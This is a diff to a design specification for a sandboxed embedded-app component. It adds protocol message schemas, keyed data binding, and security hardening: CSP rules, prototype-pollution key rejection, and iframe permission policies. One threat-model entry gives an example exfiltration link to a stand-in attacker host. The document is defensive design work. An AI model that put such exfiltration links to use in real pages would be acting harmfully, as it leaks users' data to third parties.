@@ -51,6 +51,24 @@ sequenceDiagram
 
 All communications between the host, the sandbox proxy, and the embedded app use structured JSON-RPC 2.0 messages defined by the `@modelcontextprotocol/ext-apps/app-bridge` specification.
 
+### Protocol Methods Summary
+
+The following table outlines the protocol methods used in the `McpApp` lifecycle and whether they are standard MCP Apps protocol methods or A2UI-specific extensions introduced to support A2UI v0.9 capabilities.
+
+| Method                                    | Direction                | Type         | Origin             | Purpose                                 |
+| ----------------------------------------- | ------------------------ | ------------ | ------------------ | --------------------------------------- |
+| `ui/initialize`                           | App $\rightarrow$ Host   | Request      | **Standard MCP**   | Handshake & capability negotiation      |
+| `ui/notifications/initialized`            | App $\rightarrow$ Host   | Notification | **Standard MCP**   | Handshake completion                    |
+| `tools/call`                              | App $\rightarrow$ Host   | Request      | **Standard MCP**   | Remote tool execution                   |
+| `ui/notifications/size-changed`           | App $\rightarrow$ Host   | Notification | **Standard MCP**   | Dynamic frame resizing                  |
+| `notifications/message`                   | App $\rightarrow$ Host   | Notification | **Standard MCP**   | Diagnostic logging                      |
+| `ui/notifications/sandbox-proxy-ready`    | Proxy $\rightarrow$ Host | Notification | **Standard MCP**   | Proxy frame ready signal                |
+| `ui/notifications/sandbox-resource-ready` | Host $\rightarrow$ Proxy | Notification | **Standard MCP**   | Provide HTML for inner frame            |
+| `ui/notifications/data-model-change`      | App $\rightarrow$ Host   | Notification | **A2UI Extension** | Two-way local data binding              |
+| `ui/notifications/data-model-update`      | Host $\rightarrow$ App   | Notification | **A2UI Extension** | Two-way local data binding              |
+| `ui/requests/function-call`               | App $\rightarrow$ Host   | Request      | **A2UI Extension** | Local client-side function execution    |
+| `ui/notifications/host-context-changed`   | Host $\rightarrow$ App   | Notification | **Standard MCP**   | Host context (dimensions, theme) update |
+
 ## 3.1. Handshake lifecycle
 
 To establish secure communication across the sandboxed boundaries without race conditions, the handshake is divided into two distinct phases:
@@ -158,6 +176,7 @@ Dispatched when the embedded application updates its internal state and wants to
   "jsonrpc": "2.0",
   "method": "ui/notifications/data-model-change",
   "params": {
+    "key": "string",
     "subpath": "string",
     "value": "any-primitive-or-json-object"
   }
@@ -165,10 +184,10 @@ Dispatched when the embedded application updates its internal state and wants to
 ```
 
 **Host action**  
-The host writes the `value` back to the Data Model at the path specified in the component's `data.path` definition.
+The host writes the `value` back to the Data Model at the path mapped to the specified `key` in the component's `data.paths` definition.
 
-- If `subpath` (an optional JSON Pointer or key-based path) is provided, the host resolves it relative to the root bound data path (e.g., `dataPath + subpath`) and updates only that specific sub-field.
-- If `subpath` is omitted, the host replaces the entire root value at `dataPath`.
+- If `subpath` (an optional JSON Pointer or key-based path) is provided, the host resolves it relative to the root bound data path for that key (e.g., `paths[key] + subpath`) and updates only that specific sub-field.
+- If `subpath` is omitted, the host replaces the entire root value at `paths[key]`.
 
 To avoid infinite update loops and redundant echoes, both sides should implement cycle prevention:
 
@@ -246,7 +265,7 @@ The host logs the diagnostic message to the developer console.
 
 ### A. Reactive state update (`ui/notifications/data-model-update`)
 
-Sent whenever the data bound to the `data.path` updates in the parent A2UI Data Model.
+Sent whenever the data bound to any path in `data.paths` updates in the parent A2UI Data Model.
 
 **Message schema**
 
@@ -255,6 +274,7 @@ Sent whenever the data bound to the `data.path` updates in the parent A2UI Data 
   "jsonrpc": "2.0",
   "method": "ui/notifications/data-model-update",
   "params": {
+    "key": "string",
     "subpath": "string",
     "value": "any-primitive-or-json-object"
   }
@@ -298,7 +318,30 @@ Sent as a response to a `ui/requests/function-call` request.
 **Embedded app action**  
 The embedded app processes the result or error based on its own logic.
 
-### C. Resource update (`ui/notifications/sandbox-resource-ready`)
+### C. Host context update (`ui/notifications/host-context-changed`)
+
+Sent when the host's context changes, such as when the container dimensions are resized or the theme is toggled. This aligns with the [Model Context Protocol Apps Specification: Host Context](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx).
+
+**Message schema**
+
+```json
+{
+  "jsonrpc": "2.0",
+  "method": "ui/notifications/host-context-changed",
+  "params": {
+    "theme": "string",
+    "containerDimensions": {
+      "width": "number",
+      "height": "number"
+    }
+  }
+}
+```
+
+**Embedded app action**  
+The embedded app SHOULD merge the received context fields with its current state. If `containerDimensions` are provided, the app SHOULD adapt its internal layout to fit within the newly specified fixed or flexible boundaries.
+
+### D. Resource update (`ui/notifications/sandbox-resource-ready`)
 
 Sent when the application HTML content is modified or updated by the A2UI agent.
 
@@ -356,8 +399,18 @@ The `McpApp` component is registered in the A2UI Component Catalog.
         "description": "The list of local client-side functions the embedded application is authorized to call."
       },
       "data": {
-        "$ref": "common_types.json#/$defs/DynamicValue",
-        "description": "The A2UI data model path or value bound to this component for reactive state synchronization."
+        "type": "object",
+        "properties": {
+          "paths": {
+            "type": "object",
+            "description": "A dictionary mapping custom state keys to distinct JSON Pointer paths in the data model.",
+            "additionalProperties": {
+              "type": "string"
+            }
+          }
+        },
+        "required": ["paths"],
+        "additionalProperties": false
       },
       "title": {
         "$ref": "common_types.json#/$defs/DynamicString",
@@ -392,16 +445,16 @@ The host receives the `htmlContent` property from the catalog definition:
 
 ### Content Security Policy configuration
 
-To prevent the application from sending network requests, the proxy injects a Content Security Policy (CSP) tag into the inner frame document head:
+To prevent the application from sending network requests or submitting forms externally, the proxy injects a Content Security Policy (CSP) tag into the inner frame document head:
 
 ```html
 <meta
   http-equiv="Content-Security-Policy"
-  content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none';"
+  content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none'; form-action 'none';"
 />
 ```
 
-This blocks connection protocols like fetch, XHR, WebSockets, and Server-Sent Events, forcing all communication to be routed through the `AppBridge` channel to the host.
+This blocks connection protocols like fetch, XHR, WebSockets, and Server-Sent Events, as well as form submissions and navigations (`form-action 'none'`), forcing all communication to be routed through the `AppBridge` channel to the host.
 
 ### Dynamic resizing controls
 
@@ -410,6 +463,39 @@ To prevent layout instability, the host enforces the following rules on `ui/noti
 1. **Clamping:** Height must be clamped between 100px and 2000px; width must be clamped between 200px and 3000px.
 2. **Throttling:** Consecutive size changes must be throttled to a maximum of one redraw per 100 milliseconds.
 3. **Threshold Gate:** Size changes of less than 5 pixels are ignored.
+
+### JSON payload protection over the bridge
+
+To prevent untrusted applications from crashing host parsers via stack exhaustion, exhausting memory, or polluting JavaScript object prototypes, the host bridge enforces the following rules on all incoming `tools/call`, `ui/notifications/data-model-change`, and `ui/requests/function-call` messages:
+
+1. **Prototype Pollution Key Rejection:** The host bridge recursively inspects all incoming payloads and rejects any message containing `__proto__`, `constructor`, or `prototype` property keys at any depth.
+2. **Maximum Nesting Depth:** The host bridge limits JSON object and array nesting depth to a configurable threshold (defaulting to 10 levels). Payloads exceeding this threshold are dropped immediately.
+3. **Maximum Payload Size:** The host bridge enforces a configurable payload size limit (defaulting to 64 KB / 65,536 bytes) per message to mitigate denial-of-service and memory exhaustion attacks.
+
+### Permissions Policy and capability delegation
+
+To prevent untrusted applications from accessing hardware sensors or clipboard data without explicit capability delegation, the inner iframe enforces an explicit deny-all Permissions Policy by default:
+
+```html
+<iframe
+  sandbox="allow-scripts allow-forms allow-popups allow-modals"
+  allow="camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none';"
+  ...
+></iframe>
+```
+
+When an application declares required capabilities (e.g. `permissions: ["camera", "clipboard-write"]`):
+
+1. **Dynamic Policy Construction:** The sandbox proxy uses `buildAllowAttribute(permissions)` to construct the `allow` attribute.
+2. **Capability Activation:** If granted, the `allow` attribute delegates capability access to the iframe (e.g. `allow="camera; clipboard-write;"`), enabling standard browser permission prompts and W3C Web APIs without requiring custom shims. If omitted, the default deny-all baseline remains enforced.
+
+### 1-Click Hyperlink Exfiltration via Navigation and Clickjacking Prevention
+
+- **Risk Assessment:** Likelihood: MED | Impact: HIGH | Relevant trust tiers: Tier 3 (Zero-trust untrusted) and Tier 2 (Semi-trusted partner).
+- **Security Concern:** While `connect-src 'none'` blocks API requests (`fetch`, `XMLHttpRequest`, `WebSocket`) and `form-action 'none'` blocks HTML form submissions, standard Content Security Policy directives do not govern normal hyperlink navigations. An embedded malicious script could read sensitive data model state or user inputs, dynamically construct an anchor tag containing the stolen data in query parameters (e.g., `<a href="https://attacker.com/leak?data=...">`), and use transparent CSS overlays to trick the user into clicking anywhere on the component. When combined with `allow-popups` in the iframe sandbox attributes, this click silently navigates to the attacker's server in a new tab or window, exfiltrating the payload.
+- **Recommended Architectural Controls & Future Work:**
+  - **Omit `allow-popups` by Default:** Remove `allow-popups` and `allow-popups-to-escape-sandbox` from the default sandbox attributes for Tier 3 untrusted iframe components, preventing programmatic or user-initiated new window spawns.
+  - **Capture-Phase Click Interception:** In the inner proxy sandbox document (`sandbox.html`), register a capturing-phase click listener (`document.addEventListener('click', ..., true)`) that cancels direct anchor navigations (`event.preventDefault()`) and requires external link opening to be routed through host-verified action events.
 
 # 6. Implementation guidelines
 
